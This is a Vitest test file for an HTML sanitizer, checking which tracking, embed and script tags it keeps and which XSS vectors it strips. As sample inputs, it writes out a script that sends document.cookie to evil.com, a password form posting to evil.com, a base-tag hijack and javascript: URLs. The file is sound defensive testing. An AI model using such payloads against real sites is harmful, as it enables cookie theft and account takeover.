/** @module */
import { describe, expect, it } from "vitest";

import { sanitizeHTML } from "@/lib/security/html-sanitizer";

describe("sanitizeHTML", () => {
  describe("allowed patterns (analytics, tracking, embeds)", () => {
    it("preserves script tags with integrity and crossorigin", () => {
      const input =
        '<script src="https://cdn.example.com/lib.js" integrity="sha384-abc" crossorigin="anonymous"></script>';
      const result = sanitizeHTML(input);
      expect(result).toContain('integrity="sha384-abc"');
      expect(result).toContain('crossorigin="anonymous"');
    });

    it("preserves script tags with integrity + crossorigin + async", () => {
      const input =
        '<script src="https://www.googletagmanager.com/gtag/js?id=G-123" integrity="sha384-xyz" crossorigin="anonymous" async></script>';
      const result = sanitizeHTML(input);
      expect(result).toContain("https://www.googletagmanager.com/gtag/js?id=G-123");
      expect(result).toContain("async");
      expect(result).toContain('integrity="sha384-xyz"');
      expect(result).toContain('crossorigin="anonymous"');
    });

    it("preserves noscript tags with safe content", () => {
      const input =
        '<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-123" height="0" width="0"></iframe></noscript>';
      const result = sanitizeHTML(input);
      expect(result).toContain("noscript");
      expect(result).toContain("iframe");
      expect(result).toContain("https://www.googletagmanager.com/ns.html?id=GTM-123");
    });

    it("preserves meta tags", () => {
      const input = '<meta name="viewport" content="width=device-width, initial-scale=1">';
      const result = sanitizeHTML(input);
      expect(result).toContain("meta");
      expect(result).toContain('name="viewport"');
    });

    it("preserves link tags for external resources", () => {
      const input = '<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>';
      const result = sanitizeHTML(input);
      expect(result).toContain("link");
      expect(result).toContain('rel="preconnect"');
    });

    it("preserves tracking pixel images", () => {
      const input = '<img src="https://pixel.tracker.com/1x1.gif" width="1" height="1" alt="">';
      const result = sanitizeHTML(input);
      expect(result).toContain("img");
      expect(result).toContain("https://pixel.tracker.com/1x1.gif");
    });

    it("preserves iframe embeds with sandbox", () => {
      const input =
        '<iframe src="https://embed.example.com/widget" sandbox="allow-scripts" width="300" height="200"></iframe>';
      const result = sanitizeHTML(input);
      expect(result).toContain("iframe");
      expect(result).toContain('sandbox="allow-scripts"');
    });

    it("preserves structural div and span elements", () => {
      const input = '<div id="gtm-container" class="tracking" style="display:none"></div>';
      const result = sanitizeHTML(input);
      expect(result).toContain("div");
      expect(result).toContain('id="gtm-container"');
    });
  });

  describe("blocked patterns (XSS vectors)", () => {
    it("strips inline script content (no src attribute)", () => {
      const input = "<script>alert('xss')</script>";
      const result = sanitizeHTML(input);
      expect(result).not.toContain("script");
      expect(result).not.toContain("alert");
    });

    it("strips external <script src> without integrity or crossorigin (SRI required)", () => {
      const input = '<script src="https://cdn.example.com/malicious.js" async></script>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain("script");
      expect(result).not.toContain("cdn.example.com/malicious.js");
    });

    it("strips external <script src> with integrity but no crossorigin", () => {
      // Without crossorigin, the browser ignores SRI on cross-origin requests —
      // so accepting this would be security theater.
      const input = '<script src="https://cdn.example.com/lib.js" integrity="sha384-abc"></script>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain("script");
      expect(result).not.toContain("cdn.example.com/lib.js");
    });

    it("strips external <script src> with crossorigin but no integrity", () => {
      const input = '<script src="https://cdn.example.com/lib.js" crossorigin="anonymous"></script>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain("script");
      expect(result).not.toContain("cdn.example.com/lib.js");
    });

    it("strips inline script with complex payload", () => {
      const input = "<script>document.location='https://evil.com/?c='+document.cookie</script>";
      const result = sanitizeHTML(input);
      expect(result).not.toContain("script");
      expect(result).not.toContain("document.cookie");
    });

    it("strips event handler attributes", () => {
      const input = '<div onload="evil()" onmouseover="steal()" onclick="hack()">content</div>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain("onload");
      expect(result).not.toContain("onmouseover");
      expect(result).not.toContain("onclick");
      expect(result).toContain("content");
    });

    it("strips form elements", () => {
      const input = '<form action="https://evil.com"><input type="password" name="pw"><button>Submit</button></form>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain("form");
      expect(result).not.toContain("input");
    });

    it("strips anchor tags with javascript: protocol", () => {
      const input = '<a href="javascript:void(0)">click me</a>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain("<a");
      // eslint-disable-next-line sonarjs/code-eval -- Testing that javascript: protocol is blocked
      expect(result).not.toContain("javascript:");
    });

    it("strips object and embed tags", () => {
      const input = '<object data="https://evil.com/flash.swf"><embed src="https://evil.com/payload"></object>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain("object");
      expect(result).not.toContain("embed");
    });

    it("strips base tag (URL hijacking)", () => {
      const input = '<base href="https://evil.com/">';
      const result = sanitizeHTML(input);
      expect(result).not.toContain("base");
    });
  });

  describe("edge cases", () => {
    it("handles empty string", () => {
      expect(sanitizeHTML("")).toBe("");
    });

    it("handles plain text without tags", () => {
      expect(sanitizeHTML("just plain text")).toBe("just plain text");
    });

    it("handles mixed safe and unsafe content", () => {
      const input =
        '<script src="https://analytics.com/ga.js" integrity="sha384-abc" crossorigin="anonymous" async></script>' +
        "<script>evil()</script>" +
        '<meta name="og:title" content="Safe">';
      const result = sanitizeHTML(input);
      expect(result).toContain("analytics.com/ga.js");
      expect(result).toContain("meta");
      expect(result).not.toContain("evil()");
    });

    it("drops external scripts lacking SRI even when combined with safe content", () => {
      // Supply-chain sanity check: a legitimate-looking CDN URL without SRI
      // is exactly the vector we are closing off.
      const input =
        '<script src="https://analytics.com/ga.js" async></script>' + '<meta name="og:title" content="Safe">';
      const result = sanitizeHTML(input);
      expect(result).not.toContain("analytics.com/ga.js");
      expect(result).toContain("meta");
    });
  });
});
